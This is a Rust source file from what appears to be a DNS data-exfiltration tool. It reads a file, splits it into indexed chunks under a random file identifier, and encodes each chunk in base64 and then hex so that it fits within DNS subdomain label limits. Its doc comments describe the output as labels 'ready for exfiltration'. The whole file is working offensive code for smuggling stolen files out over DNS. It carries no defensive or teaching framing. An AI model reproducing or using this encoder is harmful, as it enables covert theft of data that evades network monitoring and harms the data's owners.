use core::str;
use std::{path::PathBuf, vec};

use base64::Engine;

const DOMAIN_NAME_MAX_LENGTH: usize = 255;
const DOMAIN_LABEL_MAX_LENGTH: usize = 63;

/// Represents the root metadata node for a file being exfiltrated.
///
/// The RootNode contains the original filename and a unique 4-byte identifier
/// that links all chunks of a file together during reconstruction.
#[derive(Debug)]
pub struct RootNode {
    /// The original filename of the file being exfiltrated.
    pub file_name: String,
    /// A unique 4-byte identifier shared across all chunks of this file.
    pub file_identifier: std::rc::Rc<[u8; 4]>,
}

impl RootNode {
    /// Creates a new RootNode with a randomly generated file identifier.
    ///
    /// # Arguments
    /// * `file_name` - The original filename to associate with this root node.
    ///
    /// # Returns
    /// A new RootNode instance with a random 4-byte file identifier.
    pub fn new(file_name: String) -> Self {
        Self {
            file_name,
            file_identifier: std::rc::Rc::new(urandom::new().random_bytes()),
        }
    }

    /// Returns the node type character identifier for root nodes.
    ///
    /// # Returns
    /// The character 'r' to identify this as a root node.
    pub fn node_type(&self) -> char {
        'r'
    }
}

impl TryFrom<&PathBuf> for RootNode {
    type Error = std::io::Error;

    /// Attempts to create a RootNode from a file path.
    ///
    /// Extracts the filename component from the provided path and creates
    /// a RootNode with it. Returns an error if no filename can be extracted.
    fn try_from(value: &PathBuf) -> Result<Self, Self::Error> {
        if let Some(file_name) = value.file_name() {
            Ok(Self::new(file_name.to_string_lossy().to_string()))
        } else {
            Err(std::io::Error::new(
                std::io::ErrorKind::InvalidInput,
                "Invalid file path: no file name found",
            ))
        }
    }
}

impl std::fmt::Display for RootNode {
    /// Formats the RootNode as a string in the format: `r:filename:hexidentifier`
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "{}:{}:{}",
            self.node_type(),
            self.file_name,
            hex::encode(&*self.file_identifier)
        )
    }
}

/// Categorizes the type of data chunk in a file transmission.
#[derive(Debug)]
enum ChunkType {
    /// A regular file data chunk.
    File,
    /// The final chunk marking the end of file transmission.
    End,
}

impl Default for ChunkType {
    /// Default chunk type is File.
    fn default() -> Self {
        ChunkType::File
    }
}

/// Represents a chunk of file data being exfiltrated.
///
/// FileChunkNode contains a portion of the file payload along with metadata
/// needed to reconstruct the file (root node identifier, chunk index, and chunk type).
#[derive(Debug, Default)]
pub struct FileChunkNode {
    /// Hexadecimal-encoded identifier linking this chunk to its root node.
    pub root_node_id: String,
    /// The sequential index of this chunk within the file.
    pub index: usize,
    /// The raw file data bytes in this chunk.
    data: Vec<u8>,
    /// The type of chunk (File or End).
    chunk_type: ChunkType,
}

impl FileChunkNode {
    /// Creates a new FileChunkNode with the specified metadata and data.
    ///
    /// # Arguments
    /// * `root_node_id` - The root node identifier linking this chunk to the file.
    /// * `index` - The sequential index of this chunk.
    /// * `data` - The file data bytes for this chunk.
    ///
    /// # Returns
    /// A new FileChunkNode instance.
    pub fn new(root_node_id: std::rc::Rc<[u8; 4]>, index: usize, data: Vec<u8>) -> Self {
        Self {
            root_node_id: hex::encode(&*root_node_id),
            index,
            data,
            chunk_type: ChunkType::File,
        }
    }

    /// Appends additional data to this chunk.
    ///
    /// # Arguments
    /// * `more_data` - Additional file data bytes to append.
    pub fn extend_data(&mut self, more_data: Vec<u8>) {
        self.data.extend(more_data);
    }

    /// Marks this chunk as the final chunk of the file.
    pub fn set_last_chunk(&mut self) {
        self.chunk_type = ChunkType::End;
    }

    /// Sets the chunk index and returns self for method chaining.
    ///
    /// # Arguments
    /// * `index` - The new chunk index.
    ///
    /// # Returns
    /// Self for fluent API usage.
    pub fn set_index(mut self, index: usize) -> Self {
        self.index = index;

        return self;
    }

    /// Sets the root node identifier and returns self for method chaining.
    ///
    /// # Arguments
    /// * `root_node_id` - The raw root node identifier bytes.
    ///
    /// # Returns
    /// Self for fluent API usage.
    pub fn set_raw_root_node_id(mut self, root_node_id: std::rc::Rc<[u8; 4]>) -> Self {
        self.root_node_id = hex::encode(&*root_node_id);

        return self;
    }

    /// Returns the node type character identifier for this chunk.
    ///
    /// # Returns
    /// 'f' for a regular file chunk, 'e' for the final end chunk.
    pub fn node_type(&self) -> char {
        match self.chunk_type {
            ChunkType::File => 'f',
            ChunkType::End => 'e',
        }
    }
}

impl std::fmt::Display for FileChunkNode {
    /// Formats the FileChunkNode as a string in the format: `type:rootid:index:hexdata`
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "{}:{}:{:X}:{}",
            self.node_type(),
            self.root_node_id,
            self.index,
            hex::encode(&self.data),
        )
    }
}

/// Represents a node in the file exfiltration tree.
///
/// A Node can be either a root metadata node or a file chunk data node.
#[derive(Debug)]
pub enum Node {
    /// The root metadata node containing file information.
    Root(RootNode),
    /// A file chunk data node containing portion of the file.
    FileChunk(FileChunkNode),
}

impl Node {
    /// Returns the node type character identifier.
    ///
    /// # Returns
    /// The character representing this node's type ('r', 'f', or 'e').
    pub fn node_type(&self) -> char {
        match self {
            Self::Root(root) => root.node_type(),
            Self::FileChunk(file_chunk) => file_chunk.node_type(),
        }
    }
}

impl std::fmt::Display for Node {
    /// Formats the Node by delegating to the appropriate variant's Display implementation.
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Node::Root(root) => std::fmt::Display::fmt(root, f),
            Node::FileChunk(file_chunk) => std::fmt::Display::fmt(file_chunk, f),
        }
    }
}

/// Calculates the size expansion ratio when base64 encoding data.
///
/// Base64 encoding expands data by approximately 33% plus padding overhead.
///
/// # Arguments
/// * `chunk_size` - The size of the raw data chunk in bytes.
///
/// # Returns
/// The estimated size of the base64-encoded output in bytes.
fn compute_chunk_size_base64_encoding_ratio(chunk_size: f32) -> f32 {
    // https://crypto.stackexchange.com/questions/83952/how-do-i-calculate-base64-conversion-rate
    let base64_chacacters = 4.0 * (chunk_size as f32 / 3.0);
    let padding = 2.0 - ((chunk_size + 2.0) % 3.0);

    return base64_chacacters + padding;
}

/// Recursively computes the optimal chunk size for DNS-safe payload encoding.
///
/// Balances payload size against domain name constraints to ensure encoded chunks
/// fit within DNS label length limits (63 bytes) when base64 and hex encoded.
///
/// # Arguments
/// * `payload_length` - Total length of the file data to encode.
/// * `domain_length` - Length of the target domain name.
/// * `padding` - Optional padding to apply for constraint solving.
///
/// # Returns
/// The optimal chunk size in bytes that fits DNS constraints.
fn compute_optimal_hex_base64_chunk_size(
    payload_length: usize,
    domain_length: usize,
    padding: Option<usize>,
) -> usize {
    let op_padding = padding.unwrap_or(0);
    let chunk_size: f32 =
        if payload_length > domain_length || payload_length > DOMAIN_NAME_MAX_LENGTH {
            (payload_length as f32 / domain_length as f32) - op_padding as f32
        } else {
            (domain_length as f32 / payload_length as f32) - op_padding as f32
        };

    let encoded_chunk_size =
        (compute_chunk_size_base64_encoding_ratio(chunk_size) * 2.0).ceil() as usize;

    if encoded_chunk_size < DOMAIN_LABEL_MAX_LENGTH {
        return chunk_size.floor() as usize;
    }

    compute_optimal_hex_base64_chunk_size(payload_length, domain_length, Some(op_padding + 1))
}

/// Encodes a string using base64 then hex encoding.
///
/// # Arguments
/// * `string` - The input string to encode.
///
/// # Returns
/// A hex-encoded string of the base64-encoded input.
fn b64_hex_encode_string(string: String) -> String {
    hex::encode(base64::prelude::BASE64_STANDARD.encode(string.as_bytes()))
}

/// Reads an entire file into memory as bytes.
///
/// # Arguments
/// * `filepath` - Path to the file to read.
///
/// # Returns
/// A vector of bytes containing the file contents.
fn buffered_read_file(filepath: &PathBuf) -> Vec<u8> {
    std::fs::read_to_string(filepath)
        .unwrap()
        .bytes()
        .collect::<Vec<u8>>()
}

/// Splits file data into DNS-safe chunks with appropriate metadata nodes.
///
/// Creates a vector of nodes starting with a root node followed by file chunk nodes,
/// each sized to fit within DNS constraints when encoded.
///
/// # Arguments
/// * `root_node` - The root metadata node for the file.
/// * `file_bytes` - The complete file data to split.
/// * `max_chunk_size` - Maximum size in bytes for each encoded chunk.
///
/// # Returns
/// A vector of Node objects representing the file structure.
fn dns_safe_split_file_bytes(
    root_node: RootNode,
    file_bytes: Vec<u8>,
    max_chunk_size: usize,
) -> Vec<Node> {
    let ref_root_identifier = std::rc::Rc::clone(&root_node.file_identifier);
    let mut nodes: Vec<Node> = vec![Node::Root(root_node)];
    let mut payload_iterable = file_bytes.into_iter();
    let mut index: usize = 1;

    loop {
        let mut file_chunk_node = FileChunkNode::default()
            .set_index(index)
            .set_raw_root_node_id(std::rc::Rc::clone(&ref_root_identifier));

        let buffer_length = format!(
            "{}:{}:{:X}:",
            file_chunk_node.node_type(),
            file_chunk_node.root_node_id,
            index
        )
        .len();
        let file_bytes_portion = payload_iterable
            .by_ref()
            .take(max_chunk_size - buffer_length)
            .collect::<Vec<u8>>();

        if file_bytes_portion.is_empty() {
            break;
        }
        file_chunk_node.extend_data(file_bytes_portion);
        nodes.push(Node::FileChunk(file_chunk_node));

        index += 1;
    }

    nodes.last_mut().map(|last_node| {
        if let Node::FileChunk(chunk_node) = last_node {
            chunk_node.set_last_chunk();
        }
    });

    return nodes;
}

/// Encodes a file for DNS exfiltration with base64 and hex encoding.
///
/// Splits the file into DNS-safe chunks sized to fit within domain constraints,
/// encodes them with base64 and hex, then formats as DNS-compatible labels.
///
/// # Arguments
/// * `filepath` - Path to the file to encode.
/// * `domain_name` - The target domain name for sizing constraints.
///
/// # Returns
/// A vector of encoded DNS subdomain labels ready for exfiltration.
pub fn dns_safe_b64_encode_payload(filepath: &PathBuf, domain_name: &str) -> Vec<String> {
    let file_bytes = buffered_read_file(filepath);
    let max_chunk_size =
        compute_optimal_hex_base64_chunk_size(file_bytes.len(), domain_name.len(), None);
    let root_node = RootNode::try_from(filepath).unwrap();
    let nodes = dns_safe_split_file_bytes(root_node, file_bytes, max_chunk_size);

    nodes
        .iter()
        .map(|node| {
            b64_hex_encode_string(node.to_string())
                .as_bytes()
                .chunks(max_chunk_size)
                .filter_map(|byte| str::from_utf8(byte).ok())
                .collect::<Vec<&str>>()
                .join(".")
        })
        .collect()
}

/// Encodes a file using base64 and hex with a fixed number of chunks.
///
/// Splits the file into a specified number of chunks, creates nodes for each,
/// and encodes them with base64 and hex.
///
/// # Arguments
/// * `filepath` - Path to the file to encode.
/// * `chunks` - The number of chunks to divide the file into.
///
/// # Returns
/// A vector of base64+hex encoded strings, one per node.
pub fn b64_encode_file(filepath: &PathBuf, chunks: usize) -> Vec<String> {
    let root_node = RootNode::try_from(filepath).unwrap();
    let ref_root_identifier = std::rc::Rc::clone(&root_node.file_identifier);
    let mut nodes = vec![Node::Root(root_node)];
    let file_content = buffered_read_file(filepath);

    nodes.extend(
        file_content
            .chunks(file_content.len().div_ceil(chunks))
            .enumerate()
            .map(|(index, chunk)| {
                Node::FileChunk(FileChunkNode::new(
                    std::rc::Rc::clone(&ref_root_identifier),
                    index,
                    chunk.to_vec(),
                ))
            }),
    );

    nodes.last_mut().map(|last_node| {
        if let Node::FileChunk(chunk_node) = last_node {
            chunk_node.set_last_chunk();
        }
    });

    nodes
        .iter()
        .map(|node| b64_hex_encode_string(node.to_string()))
        .collect()
}
